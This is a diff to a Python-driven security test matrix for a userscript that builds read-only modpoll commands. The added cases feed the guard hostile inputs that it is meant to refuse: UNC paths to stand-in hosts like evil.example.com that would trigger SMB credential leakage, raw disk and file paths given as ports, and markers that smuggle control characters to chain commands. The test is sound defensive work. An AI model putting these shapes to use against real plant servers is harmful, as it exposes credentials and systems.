@@ -4,12 +4,15 @@ Lifts the command model — constants, the guard, normaliseSpec, buildCommand,
 planBlocks, the chaining — verbatim from the shipped userscript and runs it in
 Node, so what is tested is the code that ships rather than a copy of it.
 
-Five questions, each answered against that code:
+Six questions, each answered against that code:
   1. Does every command the form can produce still build and pass the guard?
   2. Do the command shapes the tool emits in the field still pass?
   3. Is every attack shape refused?
   4. Are the parity spellings a list or the API may send normalised?
   5. Does a COM port above COM9 reach modpoll as \\.\COMn, built or typed?
+  6. Is the host a port or an address, and nothing Windows would open as a share,
+     a file or a disk? Is the echo marker free of control characters, and a line
+     of any length refused?
 
 Lives beside the script it tests. Run: python security-matrix.py
 """
@@ -34,7 +37,7 @@ js += lift("    const EXE_BARE", "    // ---------------------------------------
 js += lift("    function splitByMarker", "    async function readRegisters")
 js += r"""
 let built = 0;
-const refusedLegit = [], allowedAttack = [], wrongNorm = [];
+const refusedLegit = [], allowedAttack = [], wrongNorm = [], allowedShape = [];
 
 // 1. Every combination the selects on the form can produce, built and guarded
 //    the way readRegisters builds and guards it.
@@ -71,6 +74,11 @@ for (const cmd of [
   'modpoll -1 -m enc -a 1 -t 4 -r 1 -c 1 -p 4001 192.168.10.30',
   'echo #mpc:1 & modpoll -1 -m tcp -a 1 -t 4 -r 1 -c 99 192.168.10.100 & echo #mpc:100 & modpoll -1 -m tcp -a 1 -t 4 -r 100 -c 99 192.168.10.100',
   'echo #mpc:4:100 & modpoll -1 -m tcp -a 1 -t 4 -r 100 -c 1 192.168.10.100 & echo #mpc:3:100 & modpoll -1 -m tcp -a 1 -t 3 -r 100 -c 1 192.168.10.100',
+  // Options are read wherever they stand: flags behind the port are how the field
+  // types it, and a flag pair behind the host is an option, not a value.
+  'modpoll -1 \\\\.\\COM11 -b9600 -pnone -a11',
+  'modpoll -1 -mrtu -a 11 -b 9600 -p none COM5',
+  'modpoll -1 -m tcp -a 1 -t 4 -r 1 -c 1 192.168.10.100 -c 5',
 ]) {
   try { assertReadOnly(cmd); } catch (e) { refusedLegit.push('field shape: ' + cmd + ' -> ' + e.message); }
 }
@@ -150,12 +158,47 @@ for (const [typed, want] of [
   try { assertReadOnly(got); } catch (e) { wrongPort.push('typed "' + typed + '" refused after rewrite: ' + e.message); }
 }
 
+// 6. What the host may be, the marker, the length. A UNC path makes the plant server
+//    open an SMB connection and offer its credentials to whatever server it names;
+//    \\.\PhysicalDrive0 is a disk; a name on a serial mode is a file in the working
+//    directory. \s in the marker used to let a line break through before the
+//    control-character check ran.
+const shapes = {
+  'UNC host on rtu':          'modpoll -1 -m rtu -a 1 -t 4 -r 1 -c 1 \\\\evil.example.com\\pwn',
+  'UNC host on tcp':          'modpoll -1 -m tcp -a 1 -t 4 -r 1 -c 1 \\\\10.0.0.5\\share',
+  'UNC host, no mode':        'modpoll -1 -a 1 -r 1 -c 1 \\\\evil.example.com\\pwn',
+  'disk as port':             'modpoll -1 -m rtu -a 1 -t 4 -r 1 -c 1 \\\\.\\PhysicalDrive0',
+  'long-path prefix':         'modpoll -1 -m rtu -a 1 -t 4 -r 1 -c 1 \\\\?\\C:\\x',
+  'file as port':             'modpoll -1 -m rtu -a 1 -t 4 -r 1 -c 1 c:\\temp\\x.bin',
+  'name on a serial mode':    'modpoll -1 -m rtu -a 1 -t 4 -r 1 -c 1 evil.example.com',
+  'joined -mrtu with a name': 'modpoll -1 -mrtu -a 1 -t 4 -r 1 -c 1 evil.example.com',
+  'slash path':               'modpoll -1 -m tcp -a 1 -t 4 -r 1 -c 1 //evil/share',
+  'write behind the flags':   'modpoll -1 \\\\.\\COM11 -b9600 -pnone -a11 7',
+  'marker with a line break': 'echo\n#mpc:1 & modpoll -1 -m tcp -a 1 -t 4 -r 1 -c 1 192.168.10.100',
+  'marker with a tab':        'echo\t#mpc:1 & modpoll -1 -m tcp -a 1 -t 4 -r 1 -c 1 192.168.10.100',
+  'marker with NBSP':         'echo\u00a0#mpc:1 & modpoll -1 -m tcp -a 1 -t 4 -r 1 -c 1 192.168.10.100',
+  'marker with U+2028':       'echo\u2028#mpc:1 & modpoll -1 -m tcp -a 1 -t 4 -r 1 -c 1 192.168.10.100',
+  'a line over 1000 chars':   'echo #mpc:1 & modpoll -1 -m tcp -a 1 -t 4 -r 1 -c 1 192.168.10.100 & '.repeat(16) + 'echo #mpc:2',
+  'spec: UNC host on rtu':    { spec: { mode: 'rtu', host: '\\\\evil.example.com\\pwn' } },
+  'spec: UNC host on tcp':    { spec: { mode: 'tcp', host: '\\\\10.0.0.5\\share' } },
+  'spec: disk as port':       { spec: { mode: 'rtu', host: '\\\\.\\PhysicalDrive0' } },
+  'spec: name on rtu':        { spec: { mode: 'rtu', host: 'evil.example.com' } },
+};
+for (const [name, a] of Object.entries(shapes)) {
+  try {
+    if (typeof a === 'string') assertReadOnly(a);
+    else { const spec = normaliseSpec(a.spec); chainBlocks(spec, planBlocks(spec)); }
+    allowedShape.push(name);
+  } catch (e) { /* refused, as it should be */ }
+}
+
 console.log('legit command lines built and guarded: ' + built);
 console.log(refusedLegit.length ? 'LEGIT REFUSED:\n  ' + refusedLegit.join('\n  ') : 'legit refused: none');
 console.log(allowedAttack.length ? 'ATTACKS ALLOWED: ' + allowedAttack.join(', ') : 'attacks allowed: none of ' + Object.keys(attacks).length);
 console.log(wrongNorm.length ? 'PARITY WRONG: ' + wrongNorm.join(', ') : 'parity spellings: all 9 normalised');
 console.log(wrongPort.length ? 'COM PORT WRONG:\n  ' + wrongPort.join('\n  ') : 'COM ports: above COM9 written \\\\.\\COMn, built and typed; the rest untouched');
-process.exit(refusedLegit.length || allowedAttack.length || wrongNorm.length || wrongPort.length ? 1 : 0);
+console.log(allowedShape.length ? 'HOST OR LINE SHAPES ALLOWED: ' + allowedShape.join(', ') : 'hosts, markers, lengths: none of ' + Object.keys(shapes).length + ' shapes allowed');
+process.exit(refusedLegit.length || allowedAttack.length || wrongNorm.length || wrongPort.length || allowedShape.length ? 1 : 0);
 """
 
 out = Path(os.environ.get("TEMP", ".")) / "mpc-security.js"
